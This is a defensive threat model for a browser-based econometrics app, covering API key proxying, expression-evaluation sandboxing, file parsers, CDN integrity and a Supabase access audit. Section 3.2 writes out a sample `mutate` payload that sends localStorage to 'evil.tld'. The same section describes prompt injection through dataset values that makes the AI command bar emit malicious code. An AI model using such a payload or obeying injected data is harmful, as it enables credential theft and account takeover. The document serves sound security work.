# EconSolver — Threat Model (K1)

**Written:** 2026-05-25  
**Scope:** Current client-side-only deployment + planned auth/backend extension  
**Status:** Living document — update before any backend work starts

---

## 1. Adversary Profiles

| Adversary | Motivation | Capability |
|-----------|-----------|------------|
| **Curious student** | Peek at classmate's dataset or API key | Low — browser devtools, local network sniffing |
| **Credential thief** | Steal Anthropic API key to run AI workloads at victim's expense | Medium — XSS payloads, social engineering |
| **Malicious dataset contributor** | Inject code via a crafted CSV/Stata/RDS file that executes on open | Medium — knowledge of parsers; no remote access |
| **Insider / shared-device attacker** | Access another user's research data on a shared lab computer | Low — physical access only |
| **State actor / institutional espionage** | Steal non-published thesis data or policy papers | High — supply-chain, CDN compromise, network MITM |

---

## 2. Assets at Risk

| Asset | Sensitivity | Current storage |
|-------|------------|-----------------|
| **Research datasets** (student/thesis data, policy data) | High — often unpublished, embargoed | IndexedDB in browser; never leaves device |
| **Anthropic API key** | High — financial liability | `localStorage` key `litux_api_key` |
| **Pipeline definitions** (research methodology) | Medium — intellectual property | IndexedDB |
| **AI-generated narratives** | Low | Ephemeral in memory; not persisted |
| **User identity** (future) | High — when auth lands | Not yet collected |

---

## 3. Current Attack Surface (Client-Only, No Auth)

### 3.1 API Key Exposure — ✓ RESOLVED

**Status:** The server-side proxy is fully implemented and deployed.

- `api/anthropic.js` (Vercel Serverless Function): validates Supabase JWT, checks `profiles.tier`, forwards to Anthropic using `process.env.ANTHROPIC_API_KEY` — key never reaches the browser
- `AIService.js` routes through `/api/anthropic` when `VITE_AI_PROXY_ENABLED=true` (production); the `localStorage`/env-var fallback in `getApiKey()` is explicitly dev-only

**Remaining (low-priority cleanup):**
- [ ] Remove the `VITE_ANTHROPIC_KEY` env var path from `getApiKey()` — dead code in production, confusing to maintain
- [ ] Add key masking in the dev-mode Settings UI (show only last 6 chars) for shared dev environments

### 3.2 Dynamic Expression Evaluation — Unsandboxed Code Execution

> **Updated 2026-06-05 (security re-review).** The root cause below was known; this update adds two **concrete attacker-controlled delivery paths** (imported/synced pipelines and the AI command bar) and records new `Function`-constructor sinks added since the original writeup. Re-rated and re-scoped — see "Delivery paths" and "Cross-device amplification".

**Threat:** Step expressions (`expr` / `cond` / `rules[].expr`, and `ai_tr` JS bodies) are compiled and run via the `Function` constructor **on the main thread**, which has full access to `localStorage`, `indexedDB`, `fetch`, and the DOM. Sinks:
- `runner.js` — `mutate`, `if_else`, `case_when` step evaluation
- `runner.js` — **`vector_assign` (conditional mode)** rule predicates *(added 2026-06-05)*
- `runner.js` — `ai_tr` step arrow-function body (built by `DataStudio.addFillColumnStep`)
- `FeatureTab.jsx` — live preview of `mutate` expressions
- `SimulateTab.jsx` — DGP expression evaluator
- `FormatTab.jsx` — cell format expressions

A crafted expression silently exfiltrates whatever the main thread can read: the **Supabase session token** (`localStorage`, persisted by supabase-js → account takeover + access to the user's synced data), the **Anthropic API key** in dev/non-proxy mode (`getApiKey()` reads `localStorage`), and any dataset in IndexedDB.

**Delivery paths (how attacker-controlled expressions reach the sink):**
1. **Imported pipeline JSON — HIGH.** `components/wrangling/ImportPipelineButton.jsx` validates **only that each step's `type` is a known registry type** — it does *not* inspect `expr`/`cond`/`rules`. An imported `pipeline.json` replays immediately, so a `{ "type":"mutate", "expr":"fetch('https://evil.tld?d='+encodeURIComponent(JSON.stringify(localStorage)))" }` step executes on import. Attack = social-engineer the victim into importing a shared "analysis pipeline".
2. **AI command bar — MEDIUM.** `services/AI/AIService.js#nlToPipeline` embeds **column sample values from the loaded dataset** into the model prompt; `pipeline/stepValidator.js#validateAISteps` permits `mutate` (category `features`) **without inspecting `expr`**. A crafted/untrusted dataset can prompt-inject the model into emitting a malicious `mutate`; `components/wrangling/NLCommandBar.jsx` previews only the step `type`/`desc` (not the `expr`), so the user may Apply without seeing the payload. Sink is code execution, not just text — beyond ordinary prompt injection.
3. **Self-typed expression — LOW.** User pastes a malicious expression into a `mutate`/DGP field in their own session (self-XSS; low cross-user impact).

**Risk rating:** **HIGH** (path 1 is a concrete stored-code-execution → credential/data exfiltration vector with a realistic social-engineering trigger).

**Cross-device amplification:** roadmap item #4 (cross-device persistence) turns **server-synced pipelines into an auto-running untrusted-input channel** — path 1 would fire without an explicit file import. **This hardening must land before #4 ships.**

**Mitigations — LANDED 2026-06-05** (spec `docs/superpowers/specs/2026-06-05-expr-sandbox-hardening-design.md`):
- [x] **Worker global-scrub (the real boundary).** `exprEval.worker.js` nulls `fetch`/`XMLHttpRequest`/`WebSocket`/`EventSource`/`importScripts`/`Worker`/`navigator` at init → an evaluated expression (even one reconstructing a function via the constructor escape) has no network reach and no `localStorage`/`indexedDB`/DOM.
- [x] **Route all expr to the worker + kill the unsafe fallback.** `runPipelineAsync` now routes `vector_assign`-conditional too; on worker failure it nulls the output column instead of re-evaluating on the main thread.
- [x] **Identifier denylist** (`src/pipeline/exprGuard.js` `assertSafeExpr`/`isSafeExpr`) enforced at every compile site (worker `evalCol`+`evalScope`, and the residual sync `applyStep` mutate/if_else/case_when/vector_assign sites). Harness `exprGuard.test.mjs` 23/23.
- [x] **Inspect AI/imported step expressions.** `ImportPipelineButton` blocks import of any step whose `expr`/`cond`/`cases`/`rules` reference a denylisted identifier; `validateAISteps` rejects unsafe AI-emitted expr steps (`stepValidator.test.mjs` 8/8).
- [x] **Show the payload before Apply** in the `NLCommandBar` preview (raw `expr`/`cond` rendered per step). *(Import is hard-blocked on unsafe expr, so the import-confirm dialog shows the block reason rather than the payload.)*
- [ ] **Residual (low-sev, self-scoped):** `FormatTab.applyManualPreview` builds its preview function from structured strip/replace config; the strip-`chars` are interpolated unescaped into a regex char-class (preview-only, current-user input). Escape `chars` or move to structured String ops. *Not an imported/AI vector.*
- [ ] Add a CSP header (see §3.5) — complements the above by restricting `connect-src` to throttle exfiltration egress.

### 3.3 File Upload — Binary Parser Bounds Checking

**Threat:** Malicious `.dta`, `.rds`, or `.shp/.dbf` files crafted to exploit length/offset parsing bugs in:
- `src/services/data/parsers/stata.js` (readstat-wasm — third-party)
- `src/services/data/parsers/rds.js` (custom XDR parser)
- `src/services/data/parsers/shapefile.js` (custom dBase III parser)

Typical vectors: integer overflow in record-count fields, crafted string lengths causing out-of-bounds reads, unbounded allocation.

**Risk rating:** **MEDIUM** — requires crafted file; consequence is crash or memory exposure (no RCE in browser JS, but can trigger DoS or adjacent ArrayBuffer disclosure).

**Mitigations:**
- [x] `rds.js`: max string length guard (> 1M → skip), max vector length (> 10M → throw), max list nesting depth 200
- [x] `shapefile.js`: numParts/numPoints bounds on Polyline/Polygon records; DBF recordCount/recordSize guards
- [ ] Both: wrap all reads in try/catch; surface a user-visible error, never swallow silently
- [ ] `readstat-wasm`: pin to a known-good version; subscribe to its CVE feed

### 3.4 CDN Script Integrity

**Threat:** CDN scripts loaded without Subresource Integrity (SRI):
- Leaflet (`unpkg.com`)
- proj4js (`cdnjs.cloudflare.com`)
- Observable Plot (`cdn.jsdelivr.net`)
- SheetJS (`cdn.sheetjs.com`)

A CDN compromise or BGP hijack delivers a tampered script that reads `localStorage` or exfiltrates datasets.

**Risk rating:** **MEDIUM** — supply-chain risk; unpkg/jsDelivr are widely trusted but have had incidents.

**Mitigations:**
- [ ] Add `integrity="sha384-..."` + `crossorigin="anonymous"` to all CDN `<script>` tags in `index.html`
- [ ] Pin versions (already done for most); generate SRI hashes at pin time:  
  `openssl dgst -sha384 -binary file.js | openssl base64 -A`
- [ ] Long-term: vendor scripts into `/public/vendor/` to eliminate CDN dependency entirely

### 3.5 Missing Content Security Policy

**Threat:** No CSP header currently. Any XSS vector (e.g. via a crafted dataset label rendered without escaping) could inject arbitrary scripts.

**Status:** ✓ RESOLVED — CSP, `X-Content-Type-Options`, and `X-Frame-Options` added to `vercel.json`.

**Risk rating:** **MEDIUM** — CSP significantly reduces XSS blast radius.

**Remaining:**
- [ ] Remove `'unsafe-eval'` once FeatureTab/FormatTab expression evaluation is moved to a Worker (main-thread eval still present)

### 3.6 Shared Device — IndexedDB Data Persistence

**Threat:** On a shared lab computer, a previous user's dataset persists in IndexedDB until explicitly cleared. A subsequent user can open browser devtools and read it.

**Risk rating:** **LOW-MEDIUM** — requires physical access but is realistic in LMU lab environments.

**Mitigations:**
- [x] "Clear all local data" button (⊘) in WorkspaceBar — confirm dialog, wipes IndexedDB + sessionStorage + localStorage, reloads page
- [ ] Display a visible notice in the app that data is stored locally (reinforces the privacy promise)
- [ ] Future: session-lock with PIN for shared devices (post-MVP)

### 3.7 Supabase Backend — Live RLS / Advisor Audit (2026-06-01)

First live audit of the Supabase project (`zxknjfezkatuldipdskw`) via the read/write MCP. Scope: `public` schema tables, RLS policies, `SECURITY DEFINER` functions, role grants, security advisors.

**State found:** only two tables — `feedback` (71 rows) and `profiles` (8 rows); both had RLS enabled. **No `projects`/`pipelines` tables exist** — `ClaudePlan.md` Phase 13.2 (Supabase pipeline sync) was specced but never built; there is no cross-device persistence today.

**Already safe (verified, no change needed):**
- **`profiles.tier` cannot be self-escalated.** `profiles` has only a SELECT policy (`read_own`: `auth.uid() = id`); no INSERT/UPDATE/DELETE policy → all API writes blocked by RLS. The premium paywall in `api/anthropic.js` holds.
- **`feedback` row ops correctly gated** — RLS on; only an INSERT policy for `authenticated` (`with_check auth.uid() = user_id`); no SELECT/UPDATE/DELETE policy.

**Findings + remediation (two migrations applied 2026-06-01):**

| # | Severity | Finding | Fix |
|---|----------|---------|-----|
| B1 | **HIGH** | `agent_get_feedback(token)` / `agent_mark_processed(token, ids)` were `SECURITY DEFINER` (bypass RLS) and **anon-callable** via `/rest/v1/rpc/...`, guarded only by a hardcoded guessable token `'Litux-agent-FB'`. Anyone could dump all unprocessed feedback (`user_email`, free-text `description`) or tamper with `processed`. Orphaned — unused by CI (the live reader is the `collect-feedback` edge function, gated by `x-secret`/service-role). | **Dropped both functions.** |
| B2 | MEDIUM | Three `SECURITY DEFINER` functions had a mutable `search_path` (privesc vector). | `handle_new_user` pinned to `search_path = ''`; other two dropped. |
| B3 | MEDIUM | `handle_new_user()` (signup trigger) was publicly callable as an RPC. | `REVOKE EXECUTE … FROM PUBLIC, anon, authenticated` (trigger still fires independently of caller grants). |
| B4 | LOW-MED | `anon` + `authenticated` held `UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER` on both tables (RLS-neutralised but bad hygiene / footgun). | Least-privilege grants: **`anon` now has zero privileges**; `authenticated` keeps only `feedback` INSERT/SELECT + `profiles` SELECT (exactly what the policies back). |

**Migrations (remote-only — not yet pulled into repo):** `security_harden_feedback_rpc_and_grants`, `revoke_execute_handle_new_user`.

**Remaining (open):**
- [ ] **Auth → enable Leaked Password Protection** (HaveIBeenPwned check) — dashboard toggle, only remaining security advisor WARN. Owner: Franco.
- [ ] **Rotate `AGENT_SECRET`** to a strong random value in both the Supabase function env and the GitHub Action secret — it is now the *only* gate on feedback data (the weak `Litux-agent-FB` fallback is gone).
- [ ] **Pull migrations into version control** (`npx supabase db pull`) — currently applied on remote but untracked in `supabase/migrations/`.

---

## 4. Future Attack Surface (When Auth / Backend Is Added)

These risks do not exist yet but **must be addressed before any backend code is written**. K2–K10 cover the implementation.

### 4.1 Authentication Endpoints

- Login/signup forms: parameterized queries only, bcrypt (cost ≥ 12), rate limiting (5 attempts → 15 min lockout), CAPTCHA on signup
- Sessions: httpOnly + Secure + SameSite=Strict cookies; never in `localStorage`
- Password reset: time-limited HMAC-signed tokens; single-use; invalidate on use

### 4.2 Dataset Upload to Backend

- If datasets are ever stored server-side: validate MIME type + magic bytes (not just extension), enforce per-user storage quotas, never execute uploaded content
- **Prefer keeping datasets client-side** — this is the privacy-first promise; push computation to the browser

### 4.3 Server-Side Expression Evaluation

- Never evaluate `mutate`/pipeline expressions server-side
- If a computation API is added (DML, MCMC), accept only structured JSON payloads (estimator config), never raw code strings

### 4.4 API Key Proxy

- `/api/ai` endpoint: authenticate session before forwarding to Anthropic; per-user rate limiting; log key usage (not prompt content); rotate on suspected compromise

### 4.5 IDOR / Data Isolation

- Every dataset, pipeline, and result must be scoped to a user ID server-side
- Row-Level Security on all tables — never trust user-supplied IDs without ownership check
- Audit log for all data access (K9)

---

## 5. Risk Priority Matrix

| Risk | Likelihood | Impact | Priority |
|------|-----------|--------|----------|
| ~~API key exfiltrated via XSS~~ | ~~Medium~~ | ~~Critical~~ | ~~**P0**~~ → **DONE** (server-side proxy) |
| ~~API key baked into client bundle~~ | ~~Low~~ | ~~Critical~~ | ~~**P0**~~ → **DONE** (Vercel env var only) |
| ~~Dynamic expression eval → exfiltration~~ | ~~Low~~ | ~~High~~ | ~~**P1**~~ → **DONE** (Worker sandbox) |
| ~~CDN script compromise~~ | ~~Very Low~~ | ~~Critical~~ | ~~**P1**~~ → **DONE** (SRI hashes + import map) |
| ~~Malicious file parser exploit~~ | ~~Low~~ | ~~Medium~~ | ~~**P2**~~ → **DONE** (rds.js + shapefile.js bounds) |
| ~~Missing CSP~~ | ~~Medium~~ | ~~Medium~~ | ~~**P2**~~ → **DONE** (vercel.json CSP + nosniff + DENY) |
| ~~Shared-device IndexedDB leakage~~ | ~~Medium~~ | ~~Medium~~ | ~~**P2**~~ → **DONE** (⊘ clear-all button in WorkspaceBar) |
| IDOR after auth (future) | N/A yet | Critical | **P0 when applicable** |

---

## 6. Decision Map for K2–K10

| K-item | Decision driven by this model |
|--------|-------------------------------|
| K2 Auth hardening | bcrypt, rate-limit, CAPTCHA |
| K3 Injection prevention | ✓ mutate/ai_tr/SimulateTab eval moved to Worker; CSP deployed |
| K4 API key management | ✓ Done — server-side proxy via `api/anthropic.js` + Supabase JWT auth |
| K5 Transport security | HTTPS via Vercel; add HSTS + secure cookies when auth lands |
| K6 Frontend hardening | ✓ CSP header + SRI hashes + import map integrity |
| K7 File upload safety | ✓ rds.js + shapefile.js bounds checks deployed |
| K8 Session management | httpOnly cookies + refresh rotation |
| K9 Audit logging | Auth events only; never log raw expressions or dataset content |
| K10 Pentest checklist | OWASP Top 10 before first institutional contract |

---

## 7. Out of Scope

- Server-side attacks (no server yet)
- Mobile browser quirks (target: desktop Chrome/Firefox on Vercel)
- GDPR compliance documentation (separate deliverable)
